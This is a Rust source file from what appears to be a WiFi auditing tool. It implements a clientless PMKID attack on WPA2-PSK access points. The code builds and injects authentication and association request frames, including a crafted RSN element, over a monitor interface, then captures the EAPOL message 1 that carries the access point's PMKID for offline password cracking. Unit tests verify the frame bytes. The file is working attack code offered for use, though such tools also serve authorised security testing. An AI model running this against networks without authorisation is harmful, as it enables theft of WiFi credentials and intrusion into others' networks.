//! Native, clientless PMKID solicitation.
//!
//! A background thread associates with the target AP on the attacker's behalf so
//! the AP emits an EAPOL message 1 carrying its PMKID — the "clientless" WPA
//! attack, needing no connected station. The sequence per attempt is:
//!   * an open-system authentication request,
//!   * an association request advertising an RSN IE (WPA2-PSK / CCMP),
//!   * then we watch for the solicited message 1 that carries the PMKID.
//!
//! The thread only needs to *drive* the exchange and detect success: the running
//! scan (parked on the AP's channel while the attack is in the pool, exactly like
//! deauth) captures the message 1 into the capture file, where the shared
//! detection ([`airgorah_common::handshake`]) flags the AP's PMKID. On success the
//! thread also sets the flag directly and removes itself from the attack pool.
//!
//! Like deauth this is pure frame injection over the monitor interface; it depends
//! on the driver honouring injected management frames, so results are
//! hardware-dependent.

use super::raw_socket;
use super::{get_aps, get_attack_pool};
use crate::globals::Attack;
use airgorah_common::types::*;

use libwifi::Frame;

use std::os::fd::OwnedFd;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

/// Radiotap header with no fields (version, pad, len=8, present=0): the driver
/// fills in the transmit parameters. Shared shape with the deauth injector.
const RADIOTAP: [u8; 8] = [0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00];

/// 802.11 frame-control first byte for an authentication management frame
/// (type management, subtype 11) and an association request (subtype 0).
const SUBTYPE_AUTH: u8 = 0xb0;
const SUBTYPE_ASSOC_REQ: u8 = 0x00;

/// Locally-administered fallback source MAC, used only if the monitor interface's
/// own address cannot be read.
const FALLBACK_SOURCE: [u8; 6] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01];

#[derive(thiserror::Error, Debug)]
pub enum PmkidError {
    #[error("Input/Output error: {0}")]
    IoError(#[from] std::io::Error),

    #[error("Invalid MAC address: {0}")]
    InvalidMac(String),

    #[error("This access point is already under attack")]
    AlreadyAttacked,
}

/// Launch a clientless PMKID solicitation against `ap`.
///
/// Fails if the AP is already under an attack (the pool is keyed by BSSID, so an
/// AP is under at most one attack at a time), rather than overwriting the entry
/// and leaking the running thread.
pub fn launch_pmkid_attack(iface: &str, ap: AP) -> Result<(), PmkidError> {
    let bssid = parse_mac(&ap.bssid).ok_or_else(|| PmkidError::InvalidMac(ap.bssid.clone()))?;

    if get_attack_pool().contains_key(&ap.bssid) {
        return Err(PmkidError::AlreadyAttacked);
    }

    // The association must carry a real source MAC so the AP addresses its reply
    // (message 1) back to us.
    let source = read_iface_mac(iface).unwrap_or(FALLBACK_SOURCE);

    // A hidden AP's SSID is unknown, so associate with a wildcard (empty) SSID.
    let ssid: Vec<u8> = if ap.hidden {
        Vec::new()
    } else {
        ap.essid.as_bytes().iter().take(32).copied().collect()
    };

    // Open the socket up front so a failure is reported synchronously to the GUI
    // rather than dying silently inside the thread.
    let socket = raw_socket::open(iface)?;
    raw_socket::set_recv_timeout(&socket, 100)?;

    let stop = Arc::new(AtomicBool::new(false));
    let thread_stop = Arc::clone(&stop);
    let bssid_str = ap.bssid.clone();

    let handle = std::thread::spawn(move || {
        run_solicitation(socket, bssid, bssid_str, source, ssid, thread_stop);
    });

    get_attack_pool().insert(
        ap.bssid.clone(),
        Attack {
            ap,
            target: AttackTarget::Pmkid,
            stop,
            handle,
        },
    );

    Ok(())
}

/// Solicitation thread body: retry auth + assoc and watch for the PMKID until it
/// is captured or the attack is stopped.
fn run_solicitation(
    socket: OwnedFd,
    bssid: [u8; 6],
    bssid_str: String,
    source: [u8; 6],
    ssid: Vec<u8>,
    stop: Arc<AtomicBool>,
) {
    let auth = build_auth_request(bssid, source);
    let assoc = build_assoc_request(bssid, source, &ssid);
    let mut buf = [0u8; 4096];

    log::info!("[{bssid_str}] pmkid solicitation started");

    while !stop.load(Ordering::Relaxed) {
        raw_socket::send(&socket, &auth).ok();

        // Give the AP a moment to authenticate us before associating.
        if wait_or_stopped(&stop, Duration::from_millis(80)) {
            break;
        }

        raw_socket::send(&socket, &assoc).ok();

        // Watch for the solicited message 1 carrying the PMKID.
        if poll_for_pmkid(
            &socket,
            &bssid_str,
            &mut buf,
            Duration::from_millis(600),
            &stop,
        ) {
            log::info!("[{bssid_str}] pmkid captured");

            if let Some(ap) = get_aps().get_mut(&bssid_str) {
                ap.pmkid = true;
            }

            // The solicitation is done; drop ourselves from the pool so the GUI
            // reflects that the attack has ended. Removing our own entry detaches
            // this thread's handle, which is fine as we are about to return.
            get_attack_pool().remove(&bssid_str);
            return;
        }

        if wait_or_stopped(&stop, Duration::from_millis(200)) {
            break;
        }
    }

    log::info!("[{bssid_str}] pmkid solicitation stopped");
}

/// Read frames until `window` elapses, returning `true` as soon as one is an
/// EAPOL message 1 carrying a PMKID from the target AP.
fn poll_for_pmkid(
    socket: &OwnedFd,
    bssid_str: &str,
    buf: &mut [u8],
    window: Duration,
    stop: &AtomicBool,
) -> bool {
    let deadline = Instant::now() + window;

    while Instant::now() < deadline {
        if stop.load(Ordering::Relaxed) {
            return false;
        }
        match raw_socket::recv(socket, buf) {
            Ok(0) => {}
            Ok(n) => {
                if frame_carries_pmkid(&buf[..n], bssid_str) {
                    return true;
                }
            }
            // A receive timeout (EAGAIN/EWOULDBLOCK) or benign EINTR: keep polling
            // until the deadline. Anything else is transient here too.
            Err(_) => {}
        }
    }

    false
}

/// Whether a received radiotap frame is an EAPOL key frame carrying a PMKID and
/// involving the target BSSID.
fn frame_carries_pmkid(raw: &[u8], bssid_str: &str) -> bool {
    let Ok((radiotap, body)) = radiotap::Radiotap::parse(raw) else {
        return false;
    };
    if radiotap.flags.as_ref().is_some_and(|f| f.bad_fcs) {
        return false;
    }
    let fcs = radiotap.flags.as_ref().is_some_and(|f| f.fcs);

    let frame = match libwifi::parse_frame(body, fcs) {
        Ok(frame) => frame,
        Err(_) if fcs => match libwifi::parse_frame(body, false) {
            Ok(frame) => frame,
            Err(_) => return false,
        },
        Err(_) => return false,
    };

    let (header, eapol) = match &frame {
        Frame::Data(data) => (&data.header, &data.eapol_key),
        Frame::QosData(data) => (&data.header, &data.eapol_key),
        _ => return false,
    };

    let Some(key) = eapol else {
        return false;
    };
    if key.pmkid().is_none() {
        return false;
    }

    // Confirm the frame belongs to the AP we are soliciting (message 1 is sent by
    // the AP, but checking all three addresses is robust to direction quirks).
    [&header.address_1, &header.address_2, &header.address_3]
        .iter()
        .any(|addr| addr.to_long_string().eq_ignore_ascii_case(bssid_str))
}

/// Sleep up to `dur` in small steps, returning `true` if `stop` was raised.
fn wait_or_stopped(stop: &AtomicBool, dur: Duration) -> bool {
    let deadline = Instant::now() + dur;
    while Instant::now() < deadline {
        if stop.load(Ordering::Relaxed) {
            return true;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    stop.load(Ordering::Relaxed)
}

/// Build a bare 802.11 management header: radiotap is prepended by the callers.
fn mgmt_header(subtype: u8, dst: [u8; 6], src: [u8; 6], bssid: [u8; 6]) -> Vec<u8> {
    let mut header = Vec::with_capacity(24);
    header.push(subtype); // frame control: type/subtype
    header.push(0x00); // frame control: flags
    header.extend_from_slice(&[0x00, 0x00]); // duration
    header.extend_from_slice(&dst); // address 1: destination
    header.extend_from_slice(&src); // address 2: source
    header.extend_from_slice(&bssid); // address 3: BSSID
    header.extend_from_slice(&[0x00, 0x00]); // sequence control
    header
}

/// Build an open-system authentication request (transaction sequence 1).
fn build_auth_request(bssid: [u8; 6], source: [u8; 6]) -> Vec<u8> {
    let mut frame = Vec::new();
    frame.extend_from_slice(&RADIOTAP);
    frame.extend_from_slice(&mgmt_header(SUBTYPE_AUTH, bssid, source, bssid));
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // auth algorithm: open system
    frame.extend_from_slice(&0x0001u16.to_le_bytes()); // auth transaction sequence: 1
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // status code
    frame
}

/// Build an association request advertising a WPA2-PSK / CCMP RSN IE, which is
/// what makes the AP answer with an EAPOL message 1 carrying its PMKID.
fn build_assoc_request(bssid: [u8; 6], source: [u8; 6], ssid: &[u8]) -> Vec<u8> {
    let mut frame = Vec::new();
    frame.extend_from_slice(&RADIOTAP);
    frame.extend_from_slice(&mgmt_header(SUBTYPE_ASSOC_REQ, bssid, source, bssid));

    frame.extend_from_slice(&0x0431u16.to_le_bytes()); // capability info (ESS, privacy, ...)
    frame.extend_from_slice(&0x0064u16.to_le_bytes()); // listen interval

    // SSID element (id 0). Empty for a hidden AP (wildcard).
    let ssid = &ssid[..ssid.len().min(32)];
    frame.push(0x00);
    frame.push(ssid.len() as u8);
    frame.extend_from_slice(ssid);

    // Supported rates element (id 1).
    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);

    // RSN element (id 48): version 1, group + pairwise cipher CCMP, AKM PSK, no
    // RSN capabilities. Advertising PSK is what solicits the PMKID.
    frame.extend_from_slice(&[
        0x30, 0x14, // element id 48, length 20
        0x01, 0x00, // version 1
        0x00, 0x0f, 0xac, 0x04, // group cipher suite: CCMP
        0x01, 0x00, // pairwise cipher suite count: 1
        0x00, 0x0f, 0xac, 0x04, // pairwise cipher suite: CCMP
        0x01, 0x00, // AKM suite count: 1
        0x00, 0x0f, 0xac, 0x02, // AKM suite: PSK
        0x00, 0x00, // RSN capabilities
    ]);

    frame
}

/// Read the current MAC address of a monitor interface from sysfs.
fn read_iface_mac(iface: &str) -> Option<[u8; 6]> {
    let text = std::fs::read_to_string(format!("/sys/class/net/{iface}/address")).ok()?;
    parse_mac(text.trim())
}

/// Parse a canonical `xx:xx:xx:xx:xx:xx` MAC address into raw bytes.
fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let mut bytes = [0u8; 6];
    let mut parts = mac.split(':');

    for byte in &mut bytes {
        *byte = u8::from_str_radix(parts.next()?, 16).ok()?;
    }

    if parts.next().is_some() {
        return None;
    }

    Some(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    const BSSID: [u8; 6] = [0x18, 0x86, 0x37, 0x1f, 0x30, 0x40];
    const SOURCE: [u8; 6] = [0x02, 0x11, 0x22, 0x33, 0x44, 0x55];

    #[test]
    fn auth_request_is_open_system_sequence_one() {
        let frame = build_auth_request(BSSID, SOURCE);

        // radiotap (8) + management header (24) + auth body (6).
        assert_eq!(frame.len(), 8 + 24 + 6);
        assert_eq!(frame[8], SUBTYPE_AUTH); // frame control type/subtype
        assert_eq!(&frame[12..18], &BSSID); // address 1: destination (AP)
        assert_eq!(&frame[18..24], &SOURCE); // address 2: source (us)
        assert_eq!(&frame[24..30], &BSSID); // address 3: BSSID
        assert_eq!(&frame[32..34], &0u16.to_le_bytes()); // algorithm: open system
        assert_eq!(&frame[34..36], &1u16.to_le_bytes()); // transaction sequence: 1
        assert_eq!(&frame[36..38], &0u16.to_le_bytes()); // status code
    }

    #[test]
    fn assoc_request_carries_ssid_and_psk_rsn_ie() {
        let ssid = b"MyNet";
        let frame = build_assoc_request(BSSID, SOURCE, ssid);

        assert_eq!(frame[8], SUBTYPE_ASSOC_REQ);
        // SSID element follows capability (2) + listen interval (2) at offset 36.
        assert_eq!(frame[36], 0x00); // SSID element id
        assert_eq!(frame[37], ssid.len() as u8);
        assert_eq!(&frame[38..38 + ssid.len()], ssid);

        // A full RSN IE advertising the PSK AKM must be present to solicit a PMKID.
        let rsn: [u8; 22] = [
            0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,
            0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
        ];
        assert!(frame.windows(rsn.len()).any(|window| window == rsn));
    }

    #[test]
    fn assoc_request_clamps_an_overlong_ssid() {
        let ssid = [b'a'; 40];
        let frame = build_assoc_request(BSSID, SOURCE, &ssid);
        assert_eq!(frame[37], 32); // SSID length field is capped at 32
    }

    #[test]
    fn parse_mac_reads_and_rejects() {
        assert_eq!(parse_mac("18:86:37:1F:30:40"), Some(BSSID));
        assert_eq!(parse_mac("18:86:37:1F:30"), None);
        assert_eq!(parse_mac("nope"), None);
    }
}
